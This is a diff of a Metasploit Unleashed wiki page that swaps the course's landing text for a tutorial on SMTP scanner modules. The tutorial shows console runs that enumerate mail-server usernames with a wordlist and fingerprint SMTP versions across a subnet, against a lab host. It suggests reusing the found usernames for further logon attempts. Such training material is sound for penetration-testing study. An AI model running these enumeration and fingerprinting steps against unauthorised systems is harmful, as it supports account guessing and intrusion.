@@ -2,7 +2,7 @@
 		<!DOCTYPE html>
 		<html xmlns="" xml:lang="en" lang="en" dir="ltr">
 		<head>
-			<title>Metasploit Unleashed</title>
+			<title>Scanner SMTP Auxiliary Modules - Metasploit Unleashed</title>
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/reset.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/style.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/main.css" />
@@ -25,10 +25,10 @@
 						
 						<div id="controls">
 									<ul>
-			<li id="ca-nstab-main" class="selected"><a href="Port_Scanners" title="View the content page [c]" accesskey="c">Page</a></li>
-			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Main_Page&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
-			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
-			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
+			<li id="ca-nstab-main" class="selected"><a href="Scanner_SMTP_Auxiliary_Modules" title="View the content page [c]" accesskey="c">Page</a></li>
+			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Scanner_SMTP_Auxiliary_Modules&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
+			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Scanner_SMTP_Auxiliary_Modules&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
+			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Scanner_SMTP_Auxiliary_Modules&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
 		</ul>
 							
 							<div class="portlet" id="p-personal">
@@ -57,36 +57,266 @@
 						<a id="top"></a>
 						
 						<div id="content">
-							<h1>Metasploit Unleashed</h1>
+							<h1>Scanner SMTP Auxiliary Modules</h1>
 						
 							<div id="siteSub">From Metasploit Unleashed</div>
 							<div id="contentSub"></div>
-																													<div id="jump-to-nav">Jump to: <a href="Port_Scanners#column-one">navigation</a>, <a href="Port_Scanners#searchInput">search</a></div>
+																													<div id="jump-to-nav">Jump to: <a href="Scanner_SMTP_Auxiliary_Modules#column-one">navigation</a>, <a href="Scanner_SMTP_Auxiliary_Modules#searchInput">search</a></div>
 														<!-- start content -->
-							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p>This free information security training is brought to you in a community effort to promote awareness and raise funds for underprivileged children in East Africa. Through a heart-warming effort by several security professionals, we are proud to present the most complete and in-depth open course about the Metasploit Framework.
+							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><table id="toc" class="toc"><tr><td><div id="toctitle"><h2>Contents</h2></div>
+<ul>
+<li class="toclevel-1 tocsection-1"><a href="Scanner_SMTP_Auxiliary_Modules#smtp_enum"><span class="tocnumber">1</span> <span class="toctext">smtp_enum</span></a></li>
+<li class="toclevel-1 tocsection-2"><a href="Scanner_SMTP_Auxiliary_Modules#smtp_version"><span class="tocnumber">2</span> <span class="toctext">smtp_version</span></a></li>
+</ul>
+</td></tr></table>
+<p><br />
+</p>
+<h2> <span class="mw-headline" id="smtp_enum"> smtp_enum </span></h2>
+<p>The SMTP Enumeration module will connect to a given mail server and use a wordlist to enumerate users that are present on the remote system.
+<br />
+<br />
+<pre>msf > <span style='color:#13C16A;'>use auxiliary/scanner/smtp/smtp_enum</span> 
+msf auxiliary(<span style='color:#ff0000;'>smtp_enum</span>) > <span style='color:#13C16A;'>show options</span>
+
+Module options:
+
+   Name       Current Setting                                      Required  Description
+   ----       ---------------                                      --------  -----------
+   RHOSTS                                                          yes       The target address range or CIDR identifier
+   RPORT      25                                                   yes       The target port
+   THREADS    1                                                    yes       The number of concurrent threads
+   USER_FILE  /opt/metasploit3/msf3/data/wordlists/unix_users.txt  yes       The file that contains a list of probable users accounts.
+   VERBOSE    false                                                yes       Whether to print output for all attempts</pre>
+<br />
+Using the module is a simple matter of feeding it a host or range of hosts to scan and a wordlist containing usernames to enumerate.
+<br />
+<br />
+<pre>msf auxiliary(<span style='color:#ff0000;'>smtp_enum</span>) > <span style='color:#13C16A;'>set RHOSTS 192.168.1.56</span>
+RHOSTS => 192.168.1.56
+msf auxiliary(<span style='color:#ff0000;'>smtp_enum</span>) > <span style='color:#13C16A;'>run</span>
+
+<span style='color:#0000FF;'>[*]</span> 220 metasploitable.localdomain ESMTP Postfix (Ubuntu)
+
+<span style='color:#0000FF;'>[*]</span> Domain Name: localdomain
+<span style='color:#00ff00;'>[+]</span> 192.168.1.56:25 - Found user: ROOT
+<span style='color:#00ff00;'>[+]</span> 192.168.1.56:25 - Found user: backup
+<span style='color:#00ff00;'>[+]</span> 192.168.1.56:25 - Found user: bin
+<span style='color:#00ff00;'>[+]</span> 192.168.1.56:25 - Found user: daemon
+<span style='color:#00ff00;'>[+]</span> 192.168.1.56:25 - Found user: distccd
+<span style='color:#00ff00;'>[+]</span> 192.168.1.56:25 - Found user: ftp
+<span style='color:#00ff00;'>[+]</span> 192.168.1.56:25 - Found user: games
+<span style='color:#00ff00;'>[+]</span> 192.168.1.56:25 - Found user: gnats
+<span style='color:#00ff00;'>[+]</span> 192.168.1.56:25 - Found user: irc
+<span style='color:#00ff00;'>[+]</span> 192.168.1.56:25 - Found user: libuuid
+<span style='color:#00ff00;'>[+]</span> 192.168.1.56:25 - Found user: list
+<span style='color:#00ff00;'>[+]</span> 192.168.1.56:25 - Found user: lp
+<span style='color:#00ff00;'>[+]</span> 192.168.1.56:25 - Found user: mail
+<span style='color:#00ff00;'>[+]</span> 192.168.1.56:25 - Found user: man
+<span style='color:#00ff00;'>[+]</span> 192.168.1.56:25 - Found user: news
+<span style='color:#00ff00;'>[+]</span> 192.168.1.56:25 - Found user: nobody
+<span style='color:#00ff00;'>[+]</span> 192.168.1.56:25 - Found user: postgres
+<span style='color:#00ff00;'>[+]</span> 192.168.1.56:25 - Found user: postmaster
+<span style='color:#00ff00;'>[+]</span> 192.168.1.56:25 - Found user: proxy
+<span style='color:#00ff00;'>[+]</span> 192.168.1.56:25 - Found user: root
+<span style='color:#00ff00;'>[+]</span> 192.168.1.56:25 - Found user: service
+<span style='color:#00ff00;'>[+]</span> 192.168.1.56:25 - Found user: sshd
+<span style='color:#00ff00;'>[+]</span> 192.168.1.56:25 - Found user: sync
+<span style='color:#00ff00;'>[+]</span> 192.168.1.56:25 - Found user: sys
+<span style='color:#00ff00;'>[+]</span> 192.168.1.56:25 - Found user: syslog
+<span style='color:#00ff00;'>[+]</span> 192.168.1.56:25 - Found user: user
+<span style='color:#00ff00;'>[+]</span> 192.168.1.56:25 - Found user: uucp
+<span style='color:#00ff00;'>[+]</span> 192.168.1.56:25 - Found user: www-data
+<span style='color:#ff0000;'>[-]</span> 192.168.1.56:25 - EXPN : 502 5.5.2 Error: command not recognized
+<span style='color:#00ff00;'>[+]</span> 192.168.1.56:25 Users found: ROOT, backup, bin, daemon, distccd, ftp, games, gnats, irc, libuuid, list, lp, mail, man, news, nobody, postgres, postmaster, proxy, root, service, sshd, sync, sys, syslog, user, uucp, www-data
+<span style='color:#0000FF;'>[*]</span> 192.168.1.56:25 No e-mail addresses found.
+<span style='color:#0000FF;'>[*]</span> Scanned 1 of 1 hosts (100% complete)
+<span style='color:#0000FF;'>[*]</span> Auxiliary module execution completed
+msf auxiliary(smtp_enum) ></pre>
+<br />
+Since the email username and system username are frequently the same, you can now use any enumerated users for further logon attempts against other network services.
+<br />
+</p><p><br />
+</p>
+<h2> <span class="mw-headline" id="smtp_version"> smtp_version </span></h2>
+<p>Poorly configured or vulnerable mail servers can often provide an initial foothold into a network but prior to launching an attack, we want to fingerprint the server to make our targeting as precise as possible. The <b>smtp_version</b> module, as its name implies, will scan a range of IP addresses and determine the version of any mail servers it encounters.
+<br />
+<br />
+<pre>msf > <span style='color:#13C16A;'>use auxiliary/scanner/smtp/smtp_version</span>
+msf auxiliary(<span style='color:#ff0000;'>smtp_version</span>) > <span style='color:#13C16A;'>show options</span>
+
+Module options:
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   RHOSTS                    yes       The target address range or CIDR identifier
+   RPORT    25               yes       The target port
+   THREADS  1                yes       The number of concurrent threads
+
+msf auxiliary(<span style='color:#ff0000;'>smtp_version</span>) > <span style='color:#13C16A;'>set RHOSTS 192.168.1.0/24</span>
+RHOSTS => 192.168.1.0/24
+msf auxiliary(<span style='color:#ff0000;'>smtp_version</span>) > <span style='color:#13C16A;'>set THREADS 254</span>
+THREADS => 254
+msf auxiliary(<span style='color:#ff0000;'>smtp_version</span>) > <span style='color:#13C16A;'>run</span>
+
+<span style='color:#0000FF;'>[*]</span> 192.168.1.56:25 SMTP 220 metasploitable.localdomain ESMTP Postfix (Ubuntu)\x0d\x0a
+<span style='color:#0000FF;'>[*]</span> Scanned 254 of 256 hosts (099% complete)
+<span style='color:#0000FF;'>[*]</span> Scanned 255 of 256 hosts (099% complete)
+<span style='color:#0000FF;'>[*]</span> Scanned 256 of 256 hosts (100% complete)
+<span style='color:#0000FF;'>[*]</span> Auxiliary module execution completed
+msf auxiliary(smtp_version) ></pre>
 <br />
 <br />
 </p>
-<div class="center"><div class="floatnone"><a href="File:Msfu_logo_3.png" class="image"><img alt="Msfu logo 3.png" src="http://www.offensive-security.com/w/images/f/f6/Msfu_logo_3.png" width="632" height="319" /></a></div></div>
+<hr />
 <p><br />
-<br />
-This is a free online course and if you enjoy it and find it useful, we ask that you make a donation to the HFC (Hackers For Charity), $9.00 will feed a child for a month, so any contribution is welcome. We hope you enjoy this course as much as we enjoyed making it.
-<br />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total1"><a href="http://www.offensive-security.com/w/index.php?title=Module_Reference&amp;action=edit&amp;redlink=1" class="new" title="Module Reference (page does not exist)">Module Reference</a> &gt; <a href="http://www.offensive-security.com/w/index.php?title=Auxiliary_Modules&amp;action=edit&amp;redlink=1" class="new" title="Auxiliary Modules (page does not exist)">Auxiliary Modules</a> &gt; <a href="http://www.offensive-security.com/w/index.php?title=Scanner_Modules&amp;action=edit&amp;redlink=1" class="new" title="Scanner Modules (page does not exist)">Scanner Modules</a> &gt; Scanner SMTP Auxiliary Modules</div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total2"><a href="http://www.offensive-security.com/w/index.php?title=DCERPC&amp;action=edit&amp;redlink=1" class="new" title="DCERPC (page does not exist)">DCERPC</a> &#124; <a href="http://www.offensive-security.com/w/index.php?title=Discovery&amp;action=edit&amp;redlink=1" class="new" title="Discovery (page does not exist)">Discovery</a> &#124; <a href="http://www.offensive-security.com/w/index.php?title=FTP&amp;action=edit&amp;redlink=1" class="new" title="FTP (page does not exist)">FTP</a> &#124; <a href="http://www.offensive-security.com/w/index.php?title=HTTP&amp;action=edit&amp;redlink=1" class="new" title="HTTP (page does not exist)">HTTP</a> &#124; <a href="http://www.offensive-security.com/w/index.php?title=IMAP&amp;action=edit&amp;redlink=1" class="new" title="IMAP (page does not exist)">IMAP</a> &#124; <a href="http://www.offensive-security.com/w/index.php?title=MSSQL&amp;action=edit&amp;redlink=1" class="new" title="MSSQL (page does not exist)">MSSQL</a> &#124; <a href="http://www.offensive-security.com/w/index.php?title=MySQL&amp;action=edit&amp;redlink=1" class="new" title="MySQL (page does not exist)">MySQL</a> &#124; <a href="http://www.offensive-security.com/w/index.php?title=NetBIOS&amp;action=edit&amp;redlink=1" class="new" title="NetBIOS (page does not exist)">NetBIOS</a> &#124; <a href="http://www.offensive-security.com/w/index.php?title=POP3&amp;action=edit&amp;redlink=1" class="new" title="POP3 (page does not exist)">POP3</a> &#124; <a href="Port_Scanners" title="Port Scanners" class="mw-redirect">Port Scanners</a> &#124; <a href="http://www.offensive-security.com/w/index.php?title=SMB&amp;action=edit&amp;redlink=1" class="new" title="SMB (page does not exist)">SMB</a> &#124; <a href="http://www.offensive-security.com/w/index.php?title=SMTP&amp;action=edit&amp;redlink=1" class="new" title="SMTP (page does not exist)">SMTP</a> &#124; <a href="http://www.offensive-security.com/w/index.php?title=SNMP&amp;action=edit&amp;redlink=1" class="new" title="SNMP (page does not exist)">SNMP</a> &#124; <a href="http://www.offensive-security.com/w/index.php?title=SSH&amp;action=edit&amp;redlink=1" class="new" title="SSH (page does not exist)">SSH</a> &#124; <a href="http://www.offensive-security.com/w/index.php?title=Telnet&amp;action=edit&amp;redlink=1" class="new" title="Telnet (page does not exist)">Telnet</a> &#124; <a href="http://www.offensive-security.com/w/index.php?title=TFTP&amp;action=edit&amp;redlink=1" class="new" title="TFTP (page does not exist)">TFTP</a> &#124; <a href="http://www.offensive-security.com/w/index.php?title=VNC&amp;action=edit&amp;redlink=1" class="new" title="VNC (page does not exist)">VNC</a></div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 </p>
 <!-- 
 NewPP limit report
-Preprocessor visited node count: 6/1000000
-Preprocessor generated node count: 20/1000000
-Post‐expand include size: 0/2097152 bytes
+Preprocessor visited node count: 524/1000000
+Preprocessor generated node count: 2657/1000000
+Post‐expand include size: 5460/2097152 bytes
 Template argument size: 0/2097152 bytes
-Highest expansion depth: 2/40
+Highest expansion depth: 3/40
 Expensive parser function count: 0/100
 -->
 
-<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:285-0!*!*!*!*!2!* and timestamp 20131123153816 -->
+<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:251-0!*!0!!en!*!* and timestamp 20131123202721 -->
 </div><div class="printfooter">
-Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597">http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597</a>"</div>
-							<div id='catlinks' class='catlinks catlinks-allhidden'></div>							<!-- end content -->
+Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Scanner_SMTP_Auxiliary_Modules&amp;oldid=1267">http://www.offensive-security.com/w/index.php?title=Scanner_SMTP_Auxiliary_Modules&amp;oldid=1267</a>"</div>
+							<div id='catlinks' class='catlinks'><div id="mw-normal-catlinks" class="mw-normal-catlinks"><a href="Special:Categories" title="Special:Categories">Category</a>: <ul><li><a href="http://www.offensive-security.com/w/index.php?title=Category:Scanner_Modules&amp;action=edit&amp;redlink=1" class="new" title="Category:Scanner Modules (page does not exist)">Scanner Modules</a></li></ul></div></div>							<!-- end content -->
 													</div>
 						
 					</div>
@@ -521,4 +751,4 @@ document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.
 <script type="text/javascript">
 var pageTracker = _gat._getTracker("UA-1981501-1");
 pageTracker._trackPageview();
-</script><!-- Served in 0.151 secs. --></body></html>
+</script><!-- Served in 0.143 secs. --></body></html>
